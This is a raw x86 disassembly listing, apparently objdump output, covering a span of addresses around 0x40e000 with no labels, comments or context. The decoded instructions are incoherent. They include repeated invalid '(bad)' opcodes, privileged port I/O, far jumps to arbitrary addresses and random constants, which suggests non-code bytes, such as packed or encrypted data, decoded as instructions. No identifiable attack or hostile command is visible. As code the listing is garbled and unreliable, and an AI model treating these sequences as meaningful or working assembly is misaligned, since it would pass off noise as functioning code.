  40e048:	sub    dh,BYTE PTR [ebx-0x643bf0f0]
  40e04e:	mov    eax,0x264a64d2
  40e053:	mov    ch,0x5c
  40e055:	aaa    
  40e056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e057:	cs mov edi,0x340088
  40e05d:	scas   al,BYTE PTR es:[edi]
  40e05e:	push   es
  40e05f:	call   0x77721ddf
  40e064:	dec    eax
  40e065:	or     DWORD PTR [esi-0x2c4e2596],esi
  40e06b:	push   ss
  40e06c:	out    0x98,eax
  40e06e:	push   ebx
  40e070:	adc    eax,0xa42867a4
  40e075:	jmp    0x4d9f0174
  40e07a:	jle    0x40e0b5
  40e07c:	push   esi
  40e07d:	inc    eax
  40e07e:	xchg   ebp,eax
  40e07f:	sub    eax,0x31bab377
  40e084:	imul   ebx,DWORD PTR [ebx-0x40268994],0xd8b6e4a9
  40e08e:	mov    bl,0xd5
  40e090:	(bad)  
  40e091:	push   edx
  40e092:	cli    
  40e093:	loop   0x40e06c
  40e095:	push   edi
  40e096:	out    0xdd,eax
  40e098:	pop    ds
  40e099:	push   ebp
  40e09a:	pop    es
  40e09b:	or     ebx,ecx
  40e09d:	and    dh,dh
  40e09f:	mov    cl,0xe3
  40e0a1:	adc    al,0x71
  40e0a3:	std    
  40e0a4:	loope  0x40e071
  40e0a6:	adc    ecx,edx
  40e0a8:	xchg   ebp,eax
  40e0a9:	call   0xc71:0x465a84d2
  40e0b0:	adc    edi,edi
  40e0b2:	push   es
  40e0b3:	fistp  WORD PTR [edi+edx*1-0x5a]
  40e0b7:	test   DWORD PTR [edx],eax
  40e0b9:	add    DWORD PTR [eax-0x1a56ef99],ebx
  40e0bf:	push   eax
  40e0c0:	lds    esp,FWORD PTR [ebx]
  40e0c2:	sub    BYTE PTR [ebx+ecx*4],bl
  40e0c5:	retf   0x1504
  40e0c8:	add    al,0xfb
  40e0ca:	cdq    
  40e0cb:	jle    0x40e0b0
  40e0cd:	push   ss
  40e0ce:	xor    cl,BYTE PTR [ecx-0x76438075]
  40e0d4:	inc    eax
  40e0d5:	out    0x1e,al
  40e0d7:	ret    
  40e0d8:	sub    DWORD PTR [eax+0x656b6801],edi
  40e0de:	pop    esp
  40e0df:	jb     0x40e144
  40e0e1:	sub    al,0xff
  40e0e3:	test   eax,0x12134dd1
  40e0e8:	je     0x40e08f
  40e0ea:	jnp    0x40e15b
  40e0ec:	std    
  40e0ed:	rcl    DWORD PTR [ecx],cl
  40e0ef:	or     BYTE PTR [edx],al
  40e0f1:	and    al,0x7e
  40e0f3:	sahf   
  40e0f4:	dec    ebp
  40e0f5:	sbb    ebx,DWORD PTR [ebp-0x5dfb86f7]
  40e0fb:	enter  0x423a,0x94
  40e0ff:	fpatan 
  40e101:	pop    ecx
  40e102:	fs cld 
  40e104:	fs dec edx
  40e106:	retf   
  40e107:	ret    
  40e108:	jp     0x40e0cf
  40e10a:	test   eax,0xb2ed3d15
  40e10f:	out    0xf2,eax
  40e111:	ret    0x7b79
  40e114:	mov    al,0x71
  40e116:	test   BYTE PTR [ecx-0x604ed4a4],al
  40e11c:	not    BYTE PTR [edi+0x3c5e0b00]
  40e122:	fwait
  40e123:	arpl   WORD PTR [ebx+0x42],ax
  40e126:	test   al,0x2c
  40e128:	mov    dh,0x7f
  40e12a:	cmc    
  40e12b:	addr16 mov ebp,ebp
  40e12e:	dec    ebp
  40e12f:	mov    dh,0x60
  40e131:	dec    esi
  40e132:	push   edi
  40e133:	bound  esi,QWORD PTR [edi]
  40e135:	leave  
  40e136:	cld    
  40e137:	cmp    cl,dl
  40e139:	and    BYTE PTR [edi-0x6f],bh
  40e13c:	mov    ch,0xb5
  40e13e:	clc    
  40e13f:	adc    al,0x53
  40e141:	in     al,dx
  40e142:	mov    eax,0x407c102c
  40e147:	dec    esi
  40e148:	retf   
  40e149:	rep lods eax,DWORD PTR ds:[si]
  40e14c:	dec    ebx
  40e14d:	(bad)  
  40e14e:	shl    BYTE PTR [ebp-0x19],1
  40e151:	pop    es
  40e152:	(bad)  
  40e153:	sbb    ebp,DWORD PTR [ebp-0x3e]
  40e156:	mov    ds:0x19c0cf4b,al
  40e15b:	xchg   cl,al
  40e15d:	adc    bh,BYTE PTR [esi+edx*4-0x66849c8f]
  40e164:	je     0x40e12d
  40e166:	mov    ds:0xbc1f276a,eax
  40e16b:	xor    BYTE PTR gs:[ebx+0x21c6dab3],dh
  40e172:	out    0x9a,al
  40e174:	aam    0x51
  40e176:	jnp    0x40e169
  40e178:	ret    
  40e179:	xchg   ebx,eax
  40e17a:	imul   esi,DWORD PTR [ecx],0x1fddc7dd
  40e180:	xor    DWORD PTR [edi-0x67e0a513],esi
  40e186:	pop    ebx
  40e187:	push   eax
  40e188:	lea    ebx,[edi+0x65be8402]
  40e18e:	and    ebx,0x533a8ed3
  40e194:	cmp    DWORD PTR [edi+0x3c],esi
  40e197:	(bad)  
  40e198:	(bad)  
  40e199:	mov    bh,0xc0
  40e19b:	lds    ebx,FWORD PTR ds:0x3948e6e8
  40e1a1:	mov    esi,ds
  40e1a3:	jg     0x40e162
  40e1a5:	cdq    
  40e1a6:	push   edi
  40e1a7:	cmp    esi,DWORD PTR [ebx]
  40e1a9:	jns    0x40e1c1
  40e1ab:	(bad)  
  40e1ac:	call   FWORD PTR [esi-0x2fd1b91]
  40e1b2:	or     DWORD PTR [ebx],edi
  40e1b4:	stc    
  40e1b5:	div    dl
  40e1b7:	pop    ss
  40e1b8:	jb     0x40e214
  40e1ba:	stos   DWORD PTR es:[edi],eax
  40e1bb:	mov    ah,BYTE PTR [ecx-0x1f]
  40e1be:	mov    cl,0x23
  40e1c0:	test   dl,al
  40e1c2:	adc    bl,BYTE PTR [eax+ecx*2-0x335f5449]
  40e1c9:	mov    ebx,0x5091f9cf
  40e1ce:	mov    bh,0x23
  40e1d0:	sub    DWORD PTR ds:0x9b8601b2,ecx
  40e1d6:	repz mov dl,0xce
  40e1d9:	and    al,BYTE PTR [edi+edx*4+0x13]
  40e1dd:	xchg   ebx,ebx
  40e1df:	int    0xbe
  40e1e1:	repz and eax,0x3241227b
  40e1e7:	or     al,0x33
  40e1e9:	dec    ebx
  40e1ea:	pop    esi
  40e1eb:	mov    dl,0xb7
  40e1ed:	add    DWORD PTR [edx+0x40074240],0xe64a02a0
  40e1f7:	lods   eax,DWORD PTR ds:[esi]
  40e1f8:	outs   dx,BYTE PTR ds:[esi]
  40e1fa:	arpl   WORD PTR [eax-0x6d],ax
  40e1fd:	and    eax,0x4f0716f6
  40e202:	push   ecx
  40e203:	jge    0x40e1ef
  40e205:	sub    DWORD PTR [esi-0x25],0xfca6d72
  40e20c:	sahf   
  40e20d:	push   ds
  40e20e:	push   ds
  40e20f:	adc    ebp,DWORD PTR [ebp+ebx*1-0x1511734b]
  40e216:	int3   
  40e217:	rcr    BYTE PTR [eax-0x4d3d7857],0xf3
  40e21e:	bound  esp,QWORD PTR [ebp+0x2e]
  40e221:	enter  0xce07,0xe9
  40e225:	add    bh,BYTE PTR [ecx-0x5]
  40e228:	es inc ebx
  40e22a:	call   0x31d7:0xb9a6a091
  40e231:	pop    edi
  40e232:	fnsave [ecx]
  40e234:	repz ds jne 0x40e28a
  40e238:	and    al,BYTE PTR [esi+0x54]
  40e23b:	pop    ds
  40e23c:	mov    eax,ds:0xd68d11c4
  40e241:	xchg   edx,eax
  40e242:	ret    0xf1c0
  40e245:	(bad)  
  40e246:	dec    edi
  40e247:	test   ah,bl
  40e249:	adc    BYTE PTR [ebx+0x35],bl
  40e24c:	cs inc edx
  40e24e:	dec    ebp
  40e24f:	mov    bh,0xe2
  40e251:	sub    eax,0xd802009c
  40e256:	xor    bh,BYTE PTR [eax-0x76f2b990]
  40e25c:	sub    DWORD PTR [esi-0x16dc9048],0xc8c41d7a
  40e266:	push   cs
  40e267:	push   ebp
  40e268:	fdivr  DWORD PTR [edx]
  40e26a:	mov    bh,0x5b
  40e26c:	push   0x26
  40e26e:	mov    dh,0x1a
  40e270:	xchg   ebp,eax
  40e271:	iret   
  40e272:	sub    DWORD PTR [edi+0x1a],eax
  40e275:	std    
  40e276:	dec    esi
  40e277:	push   esp
  40e278:	(bad)  
  40e279:	sbb    al,0x47
  40e27b:	fsub   DWORD PTR [edx]
  40e27d:	fwait
  40e27e:	mov    eax,ds:0x715a3b13
  40e283:	jecxz  0x40e2bf
  40e285:	cmp    DWORD PTR [edi+0x5dbd5ec2],ebx
  40e28b:	xor    ecx,DWORD PTR [ebx-0x60]
  40e28e:	das    
  40e28f:	adc    eax,0x821efdda
  40e294:	cli    
  40e295:	das    
  40e296:	shl    DWORD PTR [edi],1
  40e298:	iret   
  40e299:	scas   eax,DWORD PTR es:[edi]
  40e29a:	std    
  40e29b:	sub    DWORD PTR [esp+edi*1-0x47ef82a3],0xffffffcf
  40e2a3:	shl    ah,1
  40e2a5:	jno    0x40e2c9
  40e2a7:	les    esp,FWORD PTR [edx-0x257ced90]
  40e2ad:	scas   al,BYTE PTR es:[edi]
  40e2ae:	push   ebp
  40e2af:	mov    ds:0x123769ba,eax
  40e2b4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40e2b6:	outs   dx,BYTE PTR ds:[esi]
  40e2b7:	push   edi
  40e2b8:	scas   al,BYTE PTR es:[edi]
  40e2b9:	ficomp WORD PTR [ecx]
  40e2bb:	dec    ebx
  40e2bc:	das    
  40e2bd:	mov    edi,0x87bab21d
  40e2c2:	pop    eax
  40e2c3:	xor    ecx,DWORD PTR [ecx+0x32]
  40e2c6:	imul   ebp,esp,0x25c0b558
  40e2cc:	pop    edx
  40e2cd:	pop    eax
  40e2ce:	lahf   
  40e2cf:	fisub  DWORD PTR [ecx-0x55d0abda]
  40e2d5:	xchg   ebx,eax
  40e2d6:	call   0x239b3a2f
  40e2db:	jmp    FWORD PTR cs:[eax+0xe]
  40e2df:	cmp    eax,edx
  40e2e1:	rcr    BYTE PTR [esi+ecx*1-0x2485e4b7],cl
  40e2e8:	test   BYTE PTR [ecx+0x27ca7209],ch
  40e2ee:	in     eax,0x9c
  40e2f0:	jmp    0x11b5:0x2d1a42fd
  40e2f7:	data16 jle 0x40e328
  40e2fa:	shl    BYTE PTR [esi-0x18],cl
  40e2fd:	mov    dl,0xa5
  40e2ff:	paddd  mm5,QWORD PTR [ebp-0x6666ad25]
  40e306:	ss repz fs push esp
  40e30a:	adc    DWORD PTR [edx],eax
  40e30c:	les    edi,FWORD PTR [edx]
  40e30e:	btc    DWORD PTR [eax+ebp*8-0x3f],edi
  40e313:	hlt    
  40e314:	cmp    eax,0x5a3a501
  40e319:	fadd   DWORD PTR [eax+0x5f]
  40e31c:	mov    edi,0x5b882d58
  40e321:	jmp    0x40e2da
  40e323:	in     eax,0xb7
  40e325:	pusha  
  40e326:	das    
  40e327:	mov    ?,WORD PTR [ebp-0x44]
  40e32a:	es pop ecx
  40e32c:	ins    BYTE PTR es:[edi],dx
  40e32d:	cld    
  40e32e:	retf   
  40e32f:	jbe    0x40e394
  40e331:	lahf   
  40e332:	push   esp
  40e333:	sub    eax,0x6a58e522
  40e338:	ins    DWORD PTR es:[edi],dx
  40e339:	push   ss
  40e33a:	mov    ch,0xe0
  40e33c:	pusha  
  40e33d:	rcl    BYTE PTR [esi+edi*2],cl
  40e340:	mov    esp,0x2a70fd35
  40e345:	and    eax,0x424d37d5
  40e34a:	sbb    dh,BYTE PTR [edi]
  40e34c:	loop   0x40e37a
  40e34e:	pop    eax
  40e34f:	ds mov dl,0xeb
  40e352:	aaa    
  40e353:	pop    esp
  40e354:	xchg   ebx,eax
  40e355:	(bad)  
  40e356:	jmp    FWORD PTR [eax+0x54126d4c]
  40e35c:	pop    esp
  40e35d:	imul   edi,DWORD PTR [ecx+0x56],0x3c
  40e361:	stos   DWORD PTR es:[edi],eax
  40e362:	mov    gs,WORD PTR [edi]
  40e364:	xchg   esp,eax
  40e365:	jmp    0x842d868a
  40e36a:	add    ecx,ebp
  40e36c:	and    al,0x7f
  40e36e:	dec    ebp
  40e36f:	xchg   DWORD PTR [ecx],edi
  40e371:	and    ebx,DWORD PTR [edx-0x1b2614be]
  40e377:	dec    esp
  40e378:	inc    ecx
  40e379:	data16 xchg cl,cl
  40e37c:	mov    es,WORD PTR [ecx+0x31]
  40e37f:	xchg   esi,eax
  40e380:	pusha  
  40e381:	pop    esp
  40e382:	adc    edx,ecx
  40e384:	adc    eax,0x571ee3d7
  40e389:	sub    BYTE PTR gs:[esi+0x6c],dl
  40e38d:	shr    DWORD PTR [ebx+0x3f5e3db9],0x2c
  40e394:	pusha  
  40e395:	je     0x40e3c9
  40e397:	mov    DWORD PTR [ebp-0x46cf2df5],esi
  40e39d:	mov    esp,0x63bf12ba
  40e3a2:	std    
  40e3a3:	mul    eax
  40e3a5:	xor    esp,DWORD PTR [edi]
  40e3a7:	outs   dx,BYTE PTR ds:[esi]
  40e3a8:	(bad)  
  40e3a9:	jmp    0x44a9162e
  40e3ae:	pop    es
  40e3af:	add    eax,DWORD PTR [eax+0x3859cff]
  40e3b5:	lahf   
  40e3b6:	push   ss
  40e3b7:	push   0x47b20ef9
  40e3bc:	xchg   ebx,eax
  40e3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3bf:	pop    eax
  40e3c0:	dec    ebx
  40e3c1:	lea    esi,[ebx+0x58e67678]
  40e3c7:	xchg   ebp,eax
  40e3c8:	add    al,BYTE PTR [ecx]
  40e3ca:	inc    ebx
  40e3cb:	daa    
  40e3cc:	jge    0x40e36c
  40e3ce:	cmp    BYTE PTR [eax-0x7a],cl
  40e3d1:	adc    ebp,DWORD PTR [edi+0x44]
  40e3d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3d5:	lahf   
  40e3d6:	fdiv   st,st(3)
  40e3d8:	xchg   esp,eax
  40e3d9:	jno    0x40e364
  40e3db:	push   es
  40e3dc:	inc    edi
  40e3dd:	mov    al,ds:0xecf1f73c
  40e3e2:	outs   dx,BYTE PTR ds:[esi]
  40e3e3:	pop    ds
  40e3e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3e5:	sbb    eax,0xffffff97
  40e3e8:	jno    0x40e384
  40e3ea:	or     eax,0xb45a2f7a
  40e3ef:	jg     0x40e39c
  40e3f1:	in     al,0x32
  40e3f3:	imul   DWORD PTR ds:0x77d7b291
  40e3f9:	fistp  QWORD PTR [ebx]
  40e3fb:	or     DWORD PTR [edx*4-0x11c1d97d],ebx
  40e402:	mul    DWORD PTR [ebp+0x43]
  40e405:	dec    ecx
  40e406:	sbb    eax,0x1ac92cfa
  40e40b:	xchg   ebp,eax
  40e40c:	push   ss
  40e40d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e40e:	mov    ecx,0xc7deb24f
  40e413:	in     eax,0x1d
  40e415:	cwde   
  40e416:	out    0x5e,eax
  40e418:	pop    ds
  40e419:	or     eax,0x5d5fcc65
  40e41e:	ret    
  40e41f:	push   edi
  40e420:	fwait
  40e421:	retf   0x9af2
  40e424:	inc    edi
  40e425:	je     0x40e3cc
  40e427:	jno    0x40e3f7
  40e429:	aas    
  40e42a:	call   0x647bb1af
  40e42f:	stc    
  40e430:	test   DWORD PTR [ebx],ebp
  40e432:	jmp    0x40e412
  40e434:	in     eax,dx
  40e435:	test   BYTE PTR [edi-0x4c651e3b],ah
  40e43b:	inc    edi
  40e43c:	dec    ecx
  40e43d:	mov    ecx,0x2b6ab269
  40e442:	hlt    
  40e443:	jae    0x40e448
  40e445:	or     eax,0xdb3e299b
  40e44a:	pop    ecx
  40e44b:	cmp    al,0x87
  40e44d:	adc    ebx,DWORD PTR [edi-0x63]
  40e450:	mov    bl,0xe3
  40e452:	in     eax,0x50
  40e454:	mov    edi,0x346444fc
  40e459:	scas   eax,DWORD PTR es:[edi]
  40e45a:	xor    DWORD PTR [ebp+0x76184d02],edx
  40e460:	or     al,0x32
  40e462:	sbb    al,dh
  40e464:	xchg   edi,eax
  40e465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e466:	pop    ecx
  40e467:	(bad)  
  40e468:	(bad)  
  40e469:	(bad)  
  40e46a:	ja     0x40e499
  40e46c:	retf   
  40e46d:	push   ebp
  40e46e:	and    eax,0xe2df8b54
  40e473:	clc    
  40e474:	loopne 0x40e465
  40e476:	(bad)  
  40e477:	cld    
  40e478:	sar    BYTE PTR [ecx+0x16],0x30
  40e47c:	fisttp WORD PTR [edi]
  40e47e:	repnz mov ebx,0x4409d7ca
  40e484:	rcr    BYTE PTR [edx],cl
  40e486:	pusha  
  40e487:	pop    es
  40e488:	mov    ds:0x58bd7533,eax
  40e48d:	test   al,0x2c
  40e48f:	leave  
  40e490:	cmp    al,0x3a
  40e492:	jmp    0x60674835
  40e497:	jmp    0xdb500424
  40e49c:	add    al,dh
  40e49e:	test   al,0x3c
  40e4a0:	out    0x49,eax
  40e4a2:	xchg   ecx,esp
  40e4a4:	sub    eax,0x159ff774
  40e4a9:	add    eax,0xcc9828e8
  40e4ae:	push   es
  40e4af:	enter  0x6287,0xec
  40e4b3:	ja     0x40e524
  40e4b5:	call   0xcf7f21ff
  40e4ba:	mov    ds:0x278bdec9,eax
  40e4bf:	imul   edi,DWORD PTR [edx-0x2cb753d5],0x4676e425
  40e4c9:	movhps QWORD PTR [eax+0x40fadccf],xmm4
  40e4d0:	push   ebx
  40e4d1:	stc    
  40e4d2:	push   0x33
  40e4d4:	imul   ecx,DWORD PTR [ebx-0x70536450],0xa61f5bee
  40e4de:	call   0x8ac77141
  40e4e3:	jl     0x40e4bf
  40e4e5:	jno    0x40e46f
  40e4e7:	imul   edx,eax,0xc40482fc
  40e4ed:	inc    ebx
  40e4ee:	pop    es
  40e4ef:	jne    0x40e473
  40e4f1:	ret    0x3f59
  40e4f4:	pop    eax
  40e4f5:	push   ebx
  40e4f6:	lds    ebx,FWORD PTR [edi+ebp*4+0x38e90ddd]
  40e4fd:	jns    0x40e4cd
  40e4ff:	and    eax,DWORD PTR [edi-0x4c]
  40e502:	stos   DWORD PTR es:[edi],eax
  40e503:	pop    ss
  40e504:	pop    esi
  40e505:	xor    eax,0x70a14712
  40e50a:	retf   0x3524
  40e50d:	cmp    DWORD PTR [eax-0x174cc280],ecx
  40e513:	loope  0x40e515
  40e515:	xchg   DWORD PTR [ebx+edx*1],ecx
  40e518:	cs jecxz 0x40e52e
  40e51b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e51c:	loop   0x40e50f
  40e51e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e51f:	add    DWORD PTR [ebp+0x4e],edi
  40e522:	shr    DWORD PTR [ebp-0x3440b685],1
  40e528:	jmp    0x9fefd546
  40e52d:	(bad)
  40e531:	mov    bh,0x5d
  40e533:	lods   eax,DWORD PTR ds:[esi]
  40e534:	add    DWORD PTR [ebx-0x69295605],eax
  40e53a:	test   eax,0xce728949
  40e53f:	sar    DWORD PTR [ebx-0x40fbd23e],1
  40e545:	pop    esp
  40e546:	imul   esi
  40e548:	repz sub al,0x1e
  40e54b:	and    ah,BYTE PTR [edi-0x1c81cc7]
  40e551:	pushf  
  40e552:	xor    esp,DWORD PTR [edx-0x74]
  40e555:	lods   eax,DWORD PTR ds:[esi]
  40e556:	push   ss
  40e557:	or     eax,0xea3bac5e
  40e55c:	scas   al,BYTE PTR es:[edi]
  40e55d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e55e:	add    BYTE PTR [esi],dl
  40e560:	leave  
  40e561:	mov    ebx,0x44a9999f
  40e566:	add    DWORD PTR [ebx-0x8f11643],0xffffffc2
  40e56d:	inc    ecx
  40e56e:	shl    BYTE PTR [ecx-0x122bb8fb],cl
  40e574:	mul    DWORD PTR [ebx]
  40e576:	jno    0x40e5a1
  40e578:	mov    dh,BYTE PTR [edi-0x4aa7d49d]
  40e57e:	ja     0x40e55e
  40e580:	cmc    
  40e581:	dec    edi
  40e582:	daa    
  40e583:	retf   
  40e584:	add    al,0xb9
  40e587:	adc    edi,edx
  40e589:	in     al,dx
  40e58a:	lods   al,BYTE PTR ds:[esi]
  40e58b:	ins    DWORD PTR es:[edi],dx
  40e58c:	jmp    0x859817df
  40e591:	inc    ebp
  40e592:	add    al,BYTE PTR [edx+0x34]
  40e595:	xor    bl,BYTE PTR [ebx]
  40e597:	sbb    eax,ecx
  40e599:	mov    cl,0xb0
  40e59b:	ficomp WORD PTR [esi-0x48]
  40e59e:	sub    al,0xc6
  40e5a0:	cld    
  40e5a1:	mov    ebp,0x29ab64a1
  40e5a6:	sbb    BYTE PTR [ecx+0x1dc6e23d],0xaa
  40e5ad:	pop    DWORD PTR ds:0x5e9c58e7
  40e5b3:	in     eax,dx
  40e5b4:	leave  
  40e5b5:	sti    
  40e5b6:	(bad)  
  40e5b7:	sbb    ecx,DWORD PTR [eax-0x2870f396]
  40e5bd:	mov    ch,0xe1
  40e5bf:	push   edx
  40e5c0:	jp     0x40e5f8
  40e5c2:	pop    es
  40e5c3:	cmp    ecx,DWORD PTR [ebx-0x7df7d638]
  40e5c9:	sbb    BYTE PTR [eax],0x91
  40e5cc:	idiv   DWORD PTR ds:0x4c7066a2
  40e5d2:	loope  0x40e5e4
  40e5d4:	test   dl,dh
  40e5d6:	jle    0x40e56e
  40e5d8:	xchg   esp,eax
  40e5d9:	xchg   esi,eax
  40e5da:	rol    BYTE PTR [eax+ebx*8],1
  40e5dd:	cmp    eax,0xaa90fb1b
  40e5e2:	ret    
  40e5e3:	inc    edx
  40e5e4:	or     ch,BYTE PTR [ecx+0x4a]
  40e5e7:	mov    ss,WORD PTR [ecx-0x4e822743]
  40e5ed:	and    al,BYTE PTR [edi+0x121ec3aa]
  40e5f3:	shl    DWORD PTR [ebp+0x26],cl
  40e5f6:	aam    0xb8
  40e5f8:	pop    edx
  40e5f9:	test   eax,0x921e40db
  40e5fe:	ins    DWORD PTR es:[edi],dx
  40e5ff:	arpl   WORD PTR [esi+0x6a],bp
  40e602:	idiv   edx
  40e604:	imul   esi,DWORD PTR [edi],0x28
  40e607:	repnz jmp 0x11f7:0x8c41fca7
  40e60f:	test   BYTE PTR [esi+0x5c680ae],0x8f
  40e616:	push   esi
  40e617:	ds loop 0x40e5b1
  40e61a:	(bad)  
  40e61b:	out    dx,eax
  40e61c:	sahf   
  40e61d:	ja     0x40e66e
  40e61f:	pop    esi
  40e620:	stos   BYTE PTR es:[edi],al
  40e621:	(bad)  
  40e622:	cwde   
  40e623:	push   cs
  40e624:	ds iret 
  40e626:	sti    
  40e627:	jns    0x40e636
  40e629:	pop    esp
  40e62a:	aad    0xb8
  40e62c:	sbb    DWORD PTR [ebp+edx*4+0x5ff645bc],esp
  40e633:	adc    bh,BYTE PTR [ebp+0x39]
  40e636:	pop    edi
  40e637:	mov    ah,BYTE PTR [edx]
  40e639:	ret    
  40e63a:	addr16 mov al,ds:0xc8ba
  40e63e:	outs   dx,BYTE PTR ds:[esi]
  40e63f:	scas   eax,DWORD PTR es:[edi]
  40e640:	adc    DWORD PTR [eax-0x64],ebp
  40e643:	mul    al
  40e645:	daa    
  40e646:	mov    eax,0xc7df628f
  40e64b:	pop    ss
  40e64c:	(bad)  ds:0x23dca81c
  40e652:	sub    DWORD PTR [esp+eax*1+0x73],edi
  40e656:	mov    dl,0xb0
  40e658:	leave  
  40e659:	mul    DWORD PTR [esp+edx*4]
  40e65c:	mov    dh,0xbd
  40e65e:	xlat   BYTE PTR ds:[ebx]
  40e65f:	push   ebx
  40e660:	stos   DWORD PTR es:[edi],eax
  40e661:	pop    esi
  40e662:	mov    ah,0x3e
  40e664:	xchg   ebx,eax
  40e665:	pusha  
  40e666:	inc    ecx
  40e667:	xchg   edx,eax
  40e668:	jbe    0x40e636
  40e66a:	(bad)  
  40e66b:	fcom   QWORD PTR [esi+eiz*1-0x9]
  40e66f:	fst    DWORD PTR [ebx+0x51]
  40e672:	xchg   ebx,eax
  40e673:	cmp    esp,DWORD PTR [ebx+0x62a2719c]
  40e679:	inc    esp
  40e67a:	pop    eax
  40e67b:	xor    BYTE PTR [ebx+0x5b],bh
  40e67e:	and    eax,0x7f24d6a1
  40e683:	pop    ecx
  40e684:	inc    ebx
  40e685:	mov    eax,0xc6d0757c
  40e68a:	lahf   
  40e68b:	jnp    0x40e6f1
  40e68d:	push   ss
  40e68e:	into   
  40e68f:	and    DWORD PTR [esi-0x629d6a44],0xde6b5bc5
  40e699:	inc    esi
  40e69a:	jnp    0x40e6bf
  40e69c:	ss addr16 sub al,0x22
  40e6a0:	pop    eax
  40e6a1:	dec    eax
  40e6a2:	or     al,0xb8
  40e6a4:	fmul   QWORD PTR [ebx-0x52]
  40e6a7:	push   esp
  40e6a8:	push   0x1250a8a3
  40e6ad:	jne    0x40e686
  40e6af:	cld    
  40e6b0:	or     esi,DWORD PTR [ebp+0x50875ab7]
  40e6b6:	sub    BYTE PTR [eax+edi*1],ah
  40e6b9:	xchg   ebp,eax
  40e6ba:	xor    al,ch
  40e6bc:	ja     0x40e6d1
  40e6be:	in     al,dx
  40e6bf:	je     0x40e71a
  40e6c1:	add    eax,0xe5170aa0
  40e6c6:	xchg   ebx,eax
  40e6c7:	add    eax,0x643358f4
  40e6cc:	out    dx,eax
  40e6cd:	fld    DWORD PTR [esi+edi*2-0x402b489]
  40e6d4:	pusha  
  40e6d5:	retf   0xf28f
  40e6d8:	test   al,0x1
  40e6da:	or     ebp,ebx
  40e6dc:	jecxz  0x40e6a4
  40e6de:	add    al,0x21
  40e6e0:	mov    esp,0x7716bad0
  40e6e5:	xchg   esp,eax
  40e6e6:	cmp    DWORD PTR [ecx+edi*1-0x44],edx
  40e6ea:	inc    ebp
  40e6eb:	jo     0x40e72d
  40e6ed:	pop    es
  40e6ee:	bound  eax,QWORD PTR [eax+0x25641589]
  40e6f4:	cmp    ebx,DWORD PTR [ecx+ecx*1-0x26]
  40e6f8:	cwde   
  40e6f9:	dec    esp
  40e6fa:	adc    al,0xcc
  40e6fc:	dec    ebx
  40e6fd:	push   edi
  40e6fe:	and    ebx,DWORD PTR [ebx]
  40e700:	(bad)  
  40e701:	ror    BYTE PTR [edx-0x2c],cl
  40e704:	leave  
  40e705:	bound  ebp,QWORD PTR [edx-0x5f]
  40e708:	stos   BYTE PTR es:[edi],al
  40e709:	je     0x40e6ec
  40e70b:	(bad)  
  40e70c:	sub    BYTE PTR [ebx-0x4068a0b2],bl
  40e712:	loop   0x40e758
  40e714:	adc    al,BYTE PTR [ecx-0x6f599291]
  40e71a:	jae    0x40e711
  40e71c:	jmp    0x40e6de
  40e71e:	fisubr WORD PTR [ebx-0x6b]
  40e721:	push   0x1b0086da
  40e726:	adc    al,0x5f
  40e728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e729:	cmp    ch,BYTE PTR [eax]
  40e72b:	dec    edi
  40e72c:	(bad)  
  40e72d:	jbe    0x40e6df
  40e72f:	test   BYTE PTR [edi],0x5b
  40e732:	dec    ebp
  40e733:	ror    BYTE PTR [ecx+0x22],cl
  40e736:	mov    BYTE PTR [ecx-0x571ed13d],al
  40e73c:	inc    edx
  40e73d:	jne    0x40e792
  40e73f:	xchg   ecx,eax
  40e740:	in     al,0x9b
  40e742:	xlat   BYTE PTR ds:[ebx]
  40e743:	xchg   ebx,eax
  40e744:	test   al,0x82
  40e746:	mov    ah,0xa8
  40e748:	aaa    
  40e749:	lahf   
  40e74a:	int3   
  40e74b:	ficom  WORD PTR [eax+0x41]
  40e74e:	xor    BYTE PTR [esi+0x35653913],0x3d
  40e755:	dec    ecx
  40e756:	cmp    DWORD PTR [eax+0x17],eax
  40e759:	enter  0x3cb5,0x9c
  40e75d:	and    eax,0x1c860c73
  40e762:	inc    esi
  40e763:	cmp    esp,esp
  40e765:	jo     0x40e6f7
  40e767:	into   
  40e768:	fsub   st(3),st
  40e76a:	mov    ah,0x67
  40e76c:	loope  0x40e729
  40e76e:	aad    0xf4
  40e770:	retf   
  40e771:	ss imul ebp,eax,0xaaaffba3
  40e778:	call   0xbd4a:0x223a0dd5
  40e77f:	push   eax
  40e780:	jl     0x40e7b5
  40e782:	int    0xcc
  40e784:	xor    ch,BYTE PTR [edx]
  40e786:	cli    
  40e787:	inc    ebx
  40e788:	add    eax,0x3d339bb6
  40e78d:	add    ebx,DWORD PTR [ebx]
  40e78f:	add    BYTE PTR [ecx-0x6854b3e9],ah
  40e795:	cs push esp
  40e797:	iret   
  40e798:	xor    eax,0x622346ad
  40e79d:	outs   dx,DWORD PTR ds:[esi]
  40e79e:	add    DWORD PTR [ebx],eax
  40e7a0:	std    
  40e7a1:	addr16 neg al
  40e7a4:	scas   eax,DWORD PTR es:[edi]
  40e7a5:	sub    DWORD PTR [eax+0x70],esp
  40e7a8:	lods   eax,DWORD PTR ds:[esi]
  40e7a9:	and    al,0x1
  40e7ab:	leave  
  40e7ac:	mov    cl,0x85
  40e7ae:	mov    al,ds:0xc282cc6c
  40e7b3:	or     al,BYTE PTR [ebx]
  40e7b5:	pop    edx
  40e7b6:	lds    edi,FWORD PTR [edi+0x6051a11b]
  40e7bc:	and    DWORD PTR [ebx-0x6d],ebx
  40e7bf:	or     al,0xc2
  40e7c1:	div    edx
  40e7c3:	lea    esp,[esi]
  40e7c5:	dec    eax
  40e7c6:	popa   
  40e7c7:	pop    edx
  40e7c8:	ja     0x40e797
  40e7ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7cb:	push   cs
  40e7cc:	sbb    esi,ebp
  40e7ce:	mov    BYTE PTR [eax+0x40],bh
  40e7d1:	mov    cl,0xfd
  40e7d3:	sbb    ebp,edx
  40e7d5:	cld    
  40e7d6:	out    dx,al
